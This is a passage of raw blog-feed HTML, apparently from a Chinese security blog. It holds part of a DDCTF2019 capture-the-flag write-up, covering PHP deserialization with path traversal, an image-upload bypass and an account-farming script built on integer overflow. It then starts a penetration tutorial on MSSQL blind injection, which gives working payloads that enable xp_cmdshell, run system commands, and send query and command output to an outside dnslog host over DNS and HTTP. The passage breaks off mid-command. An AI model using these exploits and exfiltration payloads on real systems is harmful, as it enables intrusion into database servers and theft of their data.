class="keyword">exit</span>();</div><div class="line">        &#125;</div><div class="line"></div><div class="line">    &#125;</div><div class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">sanitizepath</span><span class="params">($path)</span> </span>&#123;</div><div class="line">    $path = trim($path);</div><div class="line">    $path=str_replace(<span class="string">'../'</span>,<span class="string">''</span>,$path);</div><div class="line">    $path=str_replace(<span class="string">'..\\'</span>,<span class="string">''</span>,$path);</div><div class="line">    <span class="keyword">return</span> $path;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</div><div class="line">    <span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;path)) &#123;</div><div class="line">        <span class="keyword">exit</span>();</div><div class="line">    &#125;<span class="keyword">else</span>&#123;</div><div class="line">        $path = <span class="keyword">$this</span>-&gt;sanitizepath(<span class="keyword">$this</span>-&gt;path);</div><div class="line">        <span class="keyword">if</span>(strlen($path) !== <span class="number">18</span>) &#123;</div><div class="line">            <span class="keyword">exit</span>();</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">$this</span>-&gt;response($data=file_get_contents($path),<span class="string">'Congratulations'</span>);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">exit</span>();</div><div class="line">&#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line">url:app/Session.php</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line"><span class="keyword">include</span> <span class="string">'Application.php'</span>;</div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Session</span> <span class="keyword">extends</span> <span class="title">Application</span> </span>&#123;</div><div class="line"></div><div class="line">    <span class="comment">//key建议为8位字符串</span></div><div class="line">    <span class="keyword">var</span> $eancrykey                  = <span class="string">''</span>;</div><div class="line">    <span class="keyword">var</span> $cookie_expiration= <span class="number">7200</span>;</div><div class="line">    <span class="keyword">var</span> $cookie_name                = <span class="string">'ddctf_id'</span>;</div><div class="line">    <span class="keyword">var</span> $cookie_path= <span class="string">''</span>;</div><div class="line">    <span class="keyword">var</span> $cookie_domain= <span class="string">''</span>;</div><div class="line">    <span class="keyword">var</span> $cookie_secure= <span class="keyword">FALSE</span>;</div><div class="line">    <span class="keyword">var</span> $activity                   = <span class="string">"DiDiCTF"</span>;</div><div class="line"></div><div class="line"></div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span><span class="params">()</span></span></div><div class="line"><span class="function">    </span>&#123;</div><div class="line"><span class="keyword">if</span>(<span class="keyword">parent</span>::auth()) &#123;</div><div class="line">            <span class="keyword">$this</span>-&gt;get_key();</div><div class="line">            <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;session_read()) &#123;</div><div class="line">                $data = <span class="string">'DiDI Welcome you %s'</span>;</div><div class="line">                $data = sprintf($data,$_SERVER[<span class="string">'HTTP_USER_AGENT'</span>]);</div><div class="line">                <span class="keyword">parent</span>::response($data,<span class="string">'sucess'</span>);</div><div class="line">            &#125;<span class="keyword">else</span>&#123;</div><div class="line">                <span class="keyword">$this</span>-&gt;session_create();</div><div class="line">                $data = <span class="string">'DiDI Welcome you'</span>;</div><div class="line">                <span class="keyword">parent</span>::response($data,<span class="string">'sucess'</span>);</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line"></div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">get_key</span><span class="params">()</span> </span>&#123;</div><div class="line">        <span class="comment">//eancrykey  and flag under the folder</span></div><div class="line">        <span class="keyword">$this</span>-&gt;eancrykey =  file_get_contents(<span class="string">'../config/key.txt'</span>);</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">session_read</span><span class="params">()</span> </span>&#123;</div><div class="line">        <span class="keyword">if</span>(<span class="keyword">empty</span>($_COOKIE)) &#123;</div><div class="line">        <span class="keyword">return</span> <span class="keyword">FALSE</span>;</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        $session = $_COOKIE[<span class="keyword">$this</span>-&gt;cookie_name];</div><div class="line">        <span class="keyword">if</span>(!<span class="keyword">isset</span>($session)) &#123;</div><div class="line">            <span class="keyword">parent</span>::response(<span class="string">"session not found"</span>,<span class="string">'error'</span>);</div><div class="line">            <span class="keyword">return</span> <span class="keyword">FALSE</span>;</div><div class="line">        &#125;</div><div class="line">        $hash = substr($session,strlen($session)<span class="number">-32</span>);</div><div class="line">        $session = substr($session,<span class="number">0</span>,strlen($session)<span class="number">-32</span>);</div><div class="line"></div><div class="line">        <span class="keyword">if</span>($hash !== md5(<span class="keyword">$this</span>-&gt;eancrykey.$session)) &#123;</div><div class="line">            <span class="keyword">parent</span>::response(<span class="string">"the cookie data not match"</span>,<span class="string">'error'</span>);</div><div class="line">            <span class="keyword">return</span> <span class="keyword">FALSE</span>;</div><div class="line">        &#125;</div><div class="line">        $session = unserialize($session);</div><div class="line"></div><div class="line"></div><div class="line">        <span class="keyword">if</span>(!is_array($session) <span class="keyword">OR</span> !<span class="keyword">isset</span>($session[<span class="string">'session_id'</span>]) <span class="keyword">OR</span> !<span class="keyword">isset</span>($session[<span class="string">'ip_address'</span>]) <span class="keyword">OR</span> !<span class="keyword">isset</span>($session[<span class="string">'user_agent'</span>]))&#123;</div><div class="line">            <span class="keyword">return</span> <span class="keyword">FALSE</span>;</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        <span class="keyword">if</span>(!<span class="keyword">empty</span>($_POST[<span class="string">"nickname"</span>])) &#123;</div><div class="line">            $arr = <span class="keyword">array</span>($_POST[<span class="string">"nickname"</span>],<span class="keyword">$this</span>-&gt;eancrykey);</div><div class="line">            $data = <span class="string">"Welcome my friend %s"</span>;</div><div class="line">            <span class="keyword">foreach</span> ($arr <span class="keyword">as</span> $k =&gt; $v) &#123;</div><div class="line">                $data = sprintf($data,$v);</div><div class="line">            &#125;</div><div class="line">            <span class="keyword">parent</span>::response($data,<span class="string">"Welcome"</span>);</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        <span class="keyword">if</span>($session[<span class="string">'ip_address'</span>] != $_SERVER[<span class="string">'REMOTE_ADDR'</span>]) &#123;</div><div class="line">            <span class="keyword">parent</span>::response(<span class="string">'the ip addree not match'</span>.<span class="string">'error'</span>);</div><div class="line">            <span class="keyword">return</span> <span class="keyword">FALSE</span>;</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">if</span>($session[<span class="string">'user_agent'</span>] != $_SERVER[<span class="string">'HTTP_USER_AGENT'</span>]) &#123;</div><div class="line">            <span class="keyword">parent</span>::response(<span class="string">'the user agent not match'</span>,<span class="string">'error'</span>);</div><div class="line">            <span class="keyword">return</span> <span class="keyword">FALSE</span>;</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">return</span> <span class="keyword">TRUE</span>;</div><div class="line"></div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">session_create</span><span class="params">()</span> </span>&#123;</div><div class="line">        $sessionid = <span class="string">''</span>;</div><div class="line">        <span class="keyword">while</span>(strlen($sessionid) &lt; <span class="number">32</span>) &#123;</div><div class="line">            $sessionid .= mt_rand(<span class="number">0</span>,mt_getrandmax());</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        $userdata = <span class="keyword">array</span>(</div><div class="line">            <span class="string">'session_id'</span> =&gt; md5(uniqid($sessionid,<span class="keyword">TRUE</span>)),</div><div class="line">            <span class="string">'ip_address'</span> =&gt; $_SERVER[<span class="string">'REMOTE_ADDR'</span>],</div><div class="line">            <span class="string">'user_agent'</span> =&gt; $_SERVER[<span class="string">'HTTP_USER_AGENT'</span>],</div><div class="line">            <span class="string">'user_data'</span> =&gt; <span class="string">''</span>,</div><div class="line">        );</div><div class="line"></div><div class="line">        $cookiedata = serialize($userdata);</div><div class="line">        $cookiedata = $cookiedata.md5(<span class="keyword">$this</span>-&gt;eancrykey.$cookiedata);</div><div class="line">        $expire = <span class="keyword">$this</span>-&gt;cookie_expiration + time();</div><div class="line">        setcookie(</div><div class="line">            <span class="keyword">$this</span>-&gt;cookie_name,</div><div class="line">            $cookiedata,</div><div class="line">            $expire,</div><div class="line">            <span class="keyword">$this</span>-&gt;cookie_path,</div><div class="line">            <span class="keyword">$this</span>-&gt;cookie_domain,</div><div class="line">            <span class="keyword">$this</span>-&gt;cookie_secure</div><div class="line">            );</div><div class="line"></div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line"></div><div class="line">$ddctf = <span class="keyword">new</span> Session();</div><div class="line">$ddctf-&gt;index();</div></pre></td></tr></table></figure><p><strong>通过对代码代码审计可以看到在$session = unserialize($session)这里存在一个反序列化漏洞，这个点应该是个突破点，可以通过传入反序列化字符串触发Application对象当中的_destructs方法，_destructs当中存在任意文件读取，通过任意文件读取就可以读取到flag，另外代码里面限制了$path值为18个字符，结合代码的注释可以大概猜到flag文件为<code>../config/flag.txt</code>。</strong></p><p><strong>但是想要触发反序列化漏洞，首先需要获取到<code>../config/key.txt</code>文件当中的key，否则cookie是不能随意修改的，因为这里存在认证，获取key的方法如下</strong></p><p><strong>第一步，请求Session.php，<code>session_create</code>函数会设置cookie,这里先获取到cookie</strong><br><img src="http://pic.c1imber.top/blog/20190418/aHiYJXKwQHTd.png" alt="mark"></p><p><strong>第二步：将获取到的cookie添加到请求里面，绕过”the cookie data not match”</strong><br><img src="http://pic.c1imber.top/blog/20190418/vtlx25O4WU4w.png" alt="mark"></p><p><strong>接下来在传入post参数nickname的代码处，有一个foreach循环，这里会将key输出，代码如下：</strong><br><img src="http://pic.c1imber.top/blog/20190418/l3Jbk2CXxyoS.png" alt="mark"></p><p><strong>第一次循环，将Welcome my friend %s当中的%s替换为了<code>$_POST[&#39;nickname&#39;]</code>,此时$data变为了Welcome my friend <code>$_POST[&#39;nickname&#39;]</code>,第二次循环，要将key写入$data的时候，%s已经没有了，所以这里只输出了传入的nickname而不是key</strong><br><img src="http://pic.c1imber.top/blog/20190418/NmO1mi9EAbv5.png" alt="mark"><br><strong>那么要想输出key，可以将nickname设置为%s，这样第一次循环后$data变为了Welcome my friend %s，第二次循环后%s就可以被替换为key输出了</strong><br><img src="http://pic.c1imber.top/blog/20190418/y1MpCfVvI1f5.png" alt="mark"><br><strong>获取到key值：<code>EzblrbNSO</code>,得到key后,$cookiedata的值就可以随便构造了，这里构造序列化字符串进行任意文件读取，生成的exp代码如下：</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="class"><span class="keyword">Class</span> <span class="title">Application</span> </span>&#123;</div><div class="line">    <span class="keyword">var</span> $path = <span class="string">'..././config/flag.txt'</span>;</div><div class="line">&#125;</div><div class="line">$a=<span class="keyword">new</span> Application();</div><div class="line"><span class="keyword">echo</span> serialize($a);</div><div class="line"><span class="keyword">echo</span> md5(<span class="string">'EzblrbNSO:11:"Application":1:&#123;s:4:"path";s:21:"..././config/flag.txt";&#125;'</span>);</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure><p><strong>因为 <code>$path=str_replace(&#39;../&#39;,&#39;&#39;,$path);$path=str_replace(&#39;..\\&#39;,&#39;&#39;,$path);</code>会删除<code>../</code>，所以这里需要使用双写<code>..././</code>绕过,之后得到:</strong></p><p><code>O:11:&quot;Application&quot;:1:{s:4:&quot;path&quot;;s:21:&quot;..././config/flag.txt&quot;;}5a014dbe49334e6dbb7326046950bee2</code><br><strong>将生成的exp进行传入cookie当中的ddctf_id请求即可，注意这里需要将<code>O:11:&quot;Application&quot;:1:{s:4:&quot;path&quot;;s:21:&quot;..././config/flag.txt&quot;;}</code>部分进行url编码，这样做是为了防止一些特殊字符的影响，然后就可以获取到flag了</strong><br><img src="http://pic.c1imber.top/blog/20190418/vPMp7lTuQoPn.png" alt="mark"></p><p><strong>flag:<code>DDCTF{ddctf2019_G4uqwj6E_pHVlHIDDGdV8qA2j}</code></strong></p><h3 id="Upload-IMG"><a href="#Upload-IMG" class="headerlink" title="Upload-IMG"></a>Upload-IMG</h3><p><code>http://117.51.148.166/upload.php</code></p><p><strong>题目提供了用户名和密码：</strong></p><pre><code>user：dd@ctfpass：DD@ctf#000</code></pre><p><strong>通过提供用户名密码登陆后看到是一个上传页面</strong><br><img src="http://pic.c1imber.top/blog/20190418/6Pb8mqQLuHSf.png" alt="mark"><br><strong>经过尝试发现这里对图片的16进制头做了检查，另一方面也会对上传的图片进行二次渲染，上传的图片格式都会变成jpg图片格式的</strong></p><p><strong>这里要求上传的图片里必须要phpinfo()这个字符串才能输出flag，但是由于二次渲染会的原因，图片当中插入的代码会被删除，这里需要突破二次渲染，类似于upload-labs的第16关，相关文章如下：</strong></p><p><code>https://xz.aliyun.com/t/2657</code></p><p><strong>这里可以使用文章当中提到的国外大神写的脚本实现对jpg二次渲染的突破</strong></p><p><code>https://github.com/BlackFan/jpg_payload</code><br><strong>最终通过脚本生成的图片成功得到flag</strong><br><img src="http://pic.c1imber.top/blog/20190418/QNoDrGXml9h4.png" alt="mark"></p><p><img src="http://pic.c1imber.top/blog/20190418/pj6zqJaN3Jd7.png" alt="mark"></p><p>flag:<code>DDCTF{B3s7_7ry_php1nf0_85127c366b3a9fad}</code></p><h3 id="大吉大利-今晚吃鸡"><a href="#大吉大利-今晚吃鸡" class="headerlink" title="大吉大利,今晚吃鸡~"></a>大吉大利,今晚吃鸡~</h3><p><code>http://117.51.147.155:5050/index.html#/login</code></p><p><strong>题目提示：注册用户登陆系统并购买入场票据,淘汰所有对手就能吃鸡啦~</strong></p><p><strong>注册账户登陆，发现自己只有100余额，但是购买门票需要2000余额</strong></p><p><img src="http://pic.c1imber.top/blog/20190418/BU1uMNLvLkUQ.png" alt="mark"></p><p><strong>于是想到了之前护网杯买大辣条的一道题，这里应该存在整型溢出，经过测试发现这里存在uint32位的整型溢出.在立即购买下订单的时候修改金额为2^32+1，也就是4294967297</strong><br><img src="http://pic.c1imber.top/blog/20190418/ADFyVBLmpLiI.png" alt="mark"></p><p><strong>接下来在支付的时候可以产生溢出，通过1余额购买到门票</strong></p><p><img src="http://pic.c1imber.top/blog/20190418/aDyWIhrtAFI0.png" alt="mark"><br><img src="http://pic.c1imber.top/blog/20190418/km8bh2cjwLJP.png" alt="mark"><br><strong>买到票后可以获得礼包，礼包当中包括了id和ticket，游戏规则大概是这样：每个账号在买完票后都会生成自己的id和ticket，如果想要消灭对方，需要知道对方的id和ticket才可以。</strong></p><p><strong>但是这一点注册账号是没有任何限制的，所以这里可以通过注册大量的账号，通过溢出购买门票获得id和ticket，之后使用其中一个账号消灭其它的账号即可，整个过程可以通过脚本实现，几个操作的接口如下：</strong></p><p><strong>注册接口</strong><br><code>http://117.51.147.155:5050/ctf/api/register?name=xxx&amp;password=xxx</code></p><p><strong>登陆接口</strong><br><code>http://117.51.147.155:5050/ctf/api/login?name=xxx&amp;password=xxx</code></p><p><strong>请求支付/下订单接口,下完订单会返回对应的bill_id</strong><br><code>http://117.51.147.155:5050/ctf/api/buy_ticket?ticket_price=4294967297</code></p><p><strong>支付接口：通过溢出实现门票购买,购买成功后会返回对于的id和ticket</strong><br><code>http://117.51.147.155:5050/ctf/api/pay_ticket?bill_id=</code></p><p><strong>移除对手接口</strong><br><code>http://117.51.147.155:5050/ctf/api/remove_robot?id=xxx&amp;ticket=xxx</code></p><p><strong>最终编写出脚本如下：</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> requests</div><div class="line"><span class="keyword">import</span> json</div><div class="line">username=[]</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">register</span><span class="params">()</span>:</span></div><div class="line">    i=<span class="number">1</span></div><div class="line">    <span class="keyword">while</span> <span class="keyword">True</span>:</div><div class="line">        url=<span class="string">"http://117.51.147.155:5050/ctf/api/register?name=mk%s&amp;password=12345678"</span>%(i)</div><div class="line">        r=requests.get(url).json()</div><div class="line">        <span class="keyword">print</span> r</div><div class="line">        <span class="keyword">if</span> len(username)==<span class="number">400</span>:</div><div class="line">            <span class="keyword">print</span> username</div><div class="line">            <span class="keyword">break</span></div><div class="line">        <span class="keyword">if</span> r[<span class="string">'code'</span>]==<span class="number">200</span>:</div><div class="line">            username.append(<span class="string">"mk%s"</span>%(i))</div><div class="line">            i=i+<span class="number">1</span></div><div class="line">        <span class="keyword">else</span>:</div><div class="line">            i=i+<span class="number">1</span></div><div class="line">register()</div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> username:</div><div class="line">    url=<span class="string">"http://117.51.147.155:5050/ctf/api/login?name=%s&amp;password=12345678"</span>%(i)</div><div class="line">    <span class="comment">#print url</span></div><div class="line">    r=requests.session()</div><div class="line">    r.get(url)</div><div class="line">    payurl=<span class="string">"http://117.51.147.155:5050/ctf/api/buy_ticket?ticket_price=4294967297"</span></div><div class="line">    data=r.get(payurl).json()</div><div class="line">    bill_id=data[<span class="string">'data'</span>][<span class="number">0</span>][<span class="string">'bill_id'</span>]</div><div class="line">    pay=<span class="string">"http://117.51.147.155:5050/ctf/api/pay_ticket?bill_id=%s"</span>%(bill_id)</div><div class="line">    data=r.get(pay).json()</div><div class="line">    yourid=data[<span class="string">'data'</span>][<span class="number">0</span>][<span class="string">'your_id'</span>]</div><div class="line">    ticket=data[<span class="string">'data'</span>][<span class="number">0</span>][<span class="string">'your_ticket'</span>]</div><div class="line">    r.get(<span class="string">"http://117.51.147.155:5050/ctf/api/login?name=st4rk&amp;password=12345678"</span>)</div><div class="line">    delurl=<span class="string">"http://117.51.147.155:5050/ctf/api/remove_robot?id=%s&amp;ticket=%s"</span>%(yourid,ticket)</div><div class="line">    <span class="keyword">print</span> r.get(delurl).json()</div></pre></td></tr></table></figure><p><strong>接下来就可以执行脚本获取flag，需要注意的一点就是这里不是每个账号都可以消灭成功的，而且越往后，消灭的概率就会越低，写这道题的时候自己大概注册了快10000个账号才吃到鸡==</strong></p><p><strong>最终获取到flag:</strong><br><img src="http://pic.c1imber.top/blog/20190418/Bof7wUbqtsYX.png" alt="mark"></p><p><strong>flag:<code>DDCTF{chiken_dinner_hyMCX[n47Fx)}</code></strong></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;DDCTF2019-write-up&quot;&gt;&lt;a href=&quot;#DDCTF2019-write-up&quot; class=&quot;headerlink&quot; title=&quot;DDCTF2019 write up&quot;&gt;&lt;/a&gt;DDCTF2019 write up&lt;/h1&gt;&lt;p&gt;&lt;stron
      
    
    </summary>
    
      <category term="ctf" scheme="https://c1aysec.github.io/categories/ctf/"/>
    
    
      <category term="ctf" scheme="https://c1aysec.github.io/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>渗透技巧-使用dnslog加快盲注速度(MSSQL篇)</title>
    <link href="https://c1aysec.github.io/2019/03/17/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-%E4%BD%BF%E7%94%A8dnslog%E5%8A%A0%E5%BF%AB%E7%9B%B2%E6%B3%A8%E9%80%9F%E5%BA%A6(MSSQL%E7%AF%87)/"/>
    <id>https://c1aysec.github.io/2019/03/17/渗透技巧-使用dnslog加快盲注速度(MSSQL篇)/</id>
    <published>2019-03-17T13:36:43.000Z</published>
    <updated>2020-03-31T04:41:25.512Z</updated>
    
    <content type="html"><![CDATA[<h1 id="渗透技巧-使用dnslog加快盲注速度-MSSQL篇"><a href="#渗透技巧-使用dnslog加快盲注速度-MSSQL篇" class="headerlink" title="渗透技巧-使用dnslog加快盲注速度(MSSQL篇)"></a>渗透技巧-使用dnslog加快盲注速度(MSSQL篇)</h1><p><strong>关于dnslog盲注，之前写过的两篇文章：</strong></p><p><strong>渗透技巧-使用dnslog加快盲注速度(MYSQL篇)</strong></p><p><strong>记一次dnslog接收异常分析</strong></p><p><strong>这一次详细的总结一下dnslog在mssql盲注当中的使用</strong></p><h3 id="前提条件"><a href="#前提条件" class="headerlink" title="前提条件"></a>前提条件</h3><pre><code>1.服务器操作系统为windows2.mssql数据库支持master..xp_dirtree存储过程3.mssql注入点支持执行多语句4.mssql相对与mysql的优势在于可以执行系统命令，前提是需要支持master..xp_cmdshell存储过程。</code></pre><p><strong>可以看到，相比于mysql数据库，mssql的利用方法相对来说更多一些，下面介绍两种外带数据查询的方法</strong></p><h3 id="DNS外带查询"><a href="#DNS外带查询" class="headerlink" title="DNS外带查询"></a>DNS外带查询</h3><p><strong>注入点如下</strong></p><p><img src="http://pic.c1imber.top/blog/20191108/0MNqLkFU7N2k.png?imageslim" alt="mark"></p><p><strong>注入类型为布尔盲注或者时间盲注，传参本来为get，但是长度有限制，改为post传参即可以突破限制，可以看到有10s的延时</strong></p><p><strong>尝试使用dnslog获取当前用户：</strong></p><pre><code>declare @a char(128);set @a=&apos;\\&apos;%2buser%2b&apos;.xxx.ceye.io/abc&apos;;exec master..xp_dirtree @a;-- </code></pre><p><strong>注意这里由于POST DATA参数解析的问题，+会被当成空格，所以需要进行url编码，将+变为%2b</strong></p><p><strong>简单说一下这条sql语句的意思，首先将user的执行结果拼接进unc路径，接着通过xp_dirtree存储过程向unc路径发起请求，产生dns查询，在dnslog平台留下记录，可以看到dnslog接收到的user为dbo</strong></p><p><img src="http://pic.c1imber.top/blog/20191109/yTHkeMQajXPz.png?imageslim" alt="mark"></p><p><strong>查看@@version数据库版本，由于长度超过了128个字符，需要分几次截取</strong></p><p><strong>首先确定长度</strong></p><pre><code>declare @a char(128);set @a=&apos;\\&apos;%2b(select cast(len(@@version) as char(32)))%2b&apos;.xxx.ceye.io\abc&apos;;exec master..xp_dirtree @a-- </code></pre><p><strong>因为len的结果为数字型，mssql并不存在类型转换的特性，所以数字不能与字符串直接拼接，这里需要通过cast转化为字符型，可以看到接收到长度为189字节</strong></p><p><img src="http://pic.c1imber.top/blog/20191109/zBqBnylhQOg4.png?imageslim" alt="mark"></p><p><strong>由于unc长度有限制，直接获取的话内容会被截断，所以要分两次截取：</strong></p><p><strong>第一次 1-95</strong></p><p><strong>第二次 95-189</strong></p><pre><code>declare @a char(128);set @a=&apos;\\&apos;%2b(select substring(@@version,1,95))%2b&apos;.xxx.ceye.io\abc&apos;;exec master..xp_dirtree @a--  declare @a char(128);set @a=&apos;\\&apos;%2b(select substring(@@version,96,94))%2b&apos;.xxx.ceye.io\abc&apos;;exec master..xp_dirtree @a-- </code></pre><p><strong>通过两次的截取成功获取到了完整的数据库版本信息</strong></p><p><img src="http://pic.c1imber.top/blog/20191109/GKQOgwoG6SQk.png?imageslim" alt="mark"></p><pre><code>microsoft sql server 2000 - 8.00.2039 (intel x86) may 3 2005 23:18:38 copyright (c) 1988-2003 microsoft corporation enterprise edition on windows nt 5.2 (build 3790: service pack 2)</code></pre><p><strong>当然还需要考虑一种特殊情况，假设说查询结果当中出现了一些unc路径不允许的特殊字符，那么在截取之前还需要进行一次16进制编写码</strong></p><p><strong>mssql当中字符串转16进制函数：</strong></p><pre><code>master.dbo.fn_varbintohexstr(xxx as VARBINARY(num))</code></pre><p><strong>首先查看版本信息16进制编码结果的长度</strong></p><pre><code>declare @a char(128);set @a=&apos;\\&apos;%2b(select cast(len(master.dbo.fn_varbintohexstr(cast(@@version as VARBINARY(1000)))) as char(32)))%2b&apos;.xxx.ceye.io\abc&apos;;exec master..xp_dirtree @a-- </code></pre><p><img src="http://pic.c1imber.top/blog/20191109/9xUX1j8mJVnx.png?imageslim" alt="mark"></p><p><strong>长度为758，分几次截取就可以得到完整的结果</strong></p><pre><code>declare @a char(128);set @a=&apos;\\&apos;%2b(select substring(master.dbo.fn_varbintohexstr(cast(@@version as VARBINARY(1000))),1,60))%2b&apos;.xxx.ceye.io\abc&apos;;exec master..xp_dirtree @a-- declare @a char(128);set @a=&apos;\\&apos;%2b(select substring(master.dbo.fn_varbintohexstr(cast(@@version as VARBINARY(1000))),61,60))%2b&apos;.xxx.ceye.io\abc&apos;;exec master..xp_dirtree @a-- declare @a char(128);set @a=&apos;\\&apos;%2b(select substring(master.dbo.fn_varbintohexstr(cast(@@version as VARBINARY(1000))),121,60))%2b&apos;.xxx.ceye.io\abc&apos;;exec master..xp_dirtree @a-- declare @a char(128);set @a=&apos;\\&apos;%2b(select substring(master.dbo.fn_varbintohexstr(cast(@@version as VARBINARY(1000))),181,60))%2b&apos;.xxx.ceye.io\abc&apos;;exec master..xp_dirtree @a-- declare @a char(128);set @a=&apos;\\&apos;%2b(select substring(master.dbo.fn_varbintohexstr(cast(@@version as VARBINARY(1000))),241,60))%2b&apos;.xxx.ceye.io\abc&apos;;exec master..xp_dirtree @a-- .........declare @a char(128);set @a=&apos;\\&apos;%2b(select substring(master.dbo.fn_varbintohexstr(cast(@@version as VARBINARY(1000))),661,60))%2b&apos;.xxx.ceye.io\abc&apos;;exec master..xp_dirtree @a--declare @a char(128);set @a=&apos;\\&apos;%2b(select substring(master.dbo.fn_varbintohexstr(cast(@@version as VARBINARY(1000))),721,37))%2b&apos;.xxx.ceye.io\abc&apos;;exec master..xp_dirtree @a-- </code></pre><p><img src="http://pic.c1imber.top/blog/20191109/MnCF17wsmOEk.png?imageslim" alt="mark"></p><p><strong>可以看到dnslog接收到了每一次的结果，将结果拼接后得到：</strong></p><pre><code>4d006900630072006f0073006f00660074002000530051004c00200053006500720076006500720020002000320030003000300020002d00200038002e00300030002e0032003000330039002000280049006e00740065006c002000580038003600290020000a0009004d0061007900200020003300200032003000300035002000320033003a00310038003a003300380020000a00090043006f0070007900720069006700680074002000280063002900200031003900380038002d00320030003000330020004d006900630072006f006e000a00090045006e00740065007200700072006900730065002000450064006900740069006f006e0020006f006e002000570069006e0064006f007700730020004e005400200035002e003200200028004200750069006c006400200033003700390030003a002000530065007200760069006300650020005000610063006b002000320029000a0</code></pre><p><strong>再进行16进制解码</strong></p><p><img src="http://pic.c1imber.top/blog/20191109/k5McwtBhcWju.png?imageslim" alt="mark"></p><p><strong>通过上面的思路，我们就可以获取任何数据了,同样也可以执行命令，首先看一下数据库是否支持master..xp_cmdshell这个存储过程，如果没有需要开启</strong></p><pre><code>EXEC sp_configure &apos;show advanced options&apos;,1;RECONFIGURE;EXEC sp_configure &apos;xp_cmdshell&apos;,1;RECONFIGURE;-- </code></pre><p><strong>测试注入点是否可以执行命令，最简单的办法就是ping一下ceye.io的二级域名，如果有dns记录，那就是支持了</strong></p><pre><code>exec master..xp_cmdshell &quot;ping aaa.xxx.ceye.io&quot;;-- </code></pre><p><strong>通过以下几个步骤可以将执行命令的结果回显至dnslog</strong></p><p><strong>第一步：创建临时表用于接收命令的执行结果，需要定义主键：</strong></p><pre><code>CREATE TABLE tt_tmp (id INT PRIMARY KEY IDENTITY,tmp1 nvarchar(4000));-- </code></pre><p><strong>第二步：将命令执行结果插入临时表：</strong></p><pre><code>DECLARE @code varchar(4000);SET @code=0x77686f616d69;insert into tt_tmp(tmp1) exec master..xp_cmdshell @code;-- </code></pre><p><strong>第三步：由于插入了多行，首先需要获取行数(经过测试部分版本的sqlserver在UNC查询结果的位置不能有空格，需要去除空格，使用rtrim)：</strong></p><pre><code>declare @a char(128);set @a=&apos;\\&apos;%2b(select rtrim(cast(COUNT(*) as char(32))) from tt_tmp)%2b&apos;.xxx.ceye.io\abc&apos;;exec master..xp_dirtree @a;-- </code></pre><p><strong>第四步：将查询结果发送至dnslog(逐行读取，截取字符串)</strong></p><pre><code>declare @a char(128);set @a=&apos;\\&apos;%2b(select substring(master.dbo.fn_varbintohexstr(cast(cast((select tmp1 from tt_tmp where id=1) as char(255)) as VARBINARY(4000))),1,60))%2b&apos;.xxx.ceye.io\abc&apos;;exec master..xp_dirtree @a;-- 1-6061-120121-180181-240241-300301-360361-420421-480481-512</code></pre><p><strong>成功后记得删除临时表</strong></p><pre><code>drop table tt_tmp;-- </code></pre><p><strong>主要过程就是创建一个临时表，然后读取临时表，将读取的结果发送至dnslog，结果如下</strong></p><p><img src="http://pic.c1imber.top/blog/20191109/gdOYM8Vnn0yl.png?imageslim" alt="mark"></p><h3 id="HTTP外带查询"><a href="#HTTP外带查询" class="headerlink" title="HTTP外带查询"></a>HTTP外带查询</h3><p><strong>通过第一种方法，可以看到dns外带查询对长度以及一些特殊字符都有着严格的限制，比较麻烦，为了解决这个问题，可以通过HTTP外带查询的方式去代替</strong></p><p><strong>可以通过cmd命令，将执行命令的结果拼接进url，启动浏览器进程去发起http请求</strong></p><p><strong>执行whoami</strong></p><pre><code>exec master..xp_cmdshell &quot;for /F %i in (&apos;whoami&apos;) do start http://xxx.ceye.io/%i&quot;--</code></pre><p><img src="http://pic.c1imber.top/blog/20191109/Qd6243BxirrD.png?imageslim" alt="mark"></p><p><strong>执行dir</strong></p><pre><code>exec master..xp_cmdshell &quot;for /F %i in 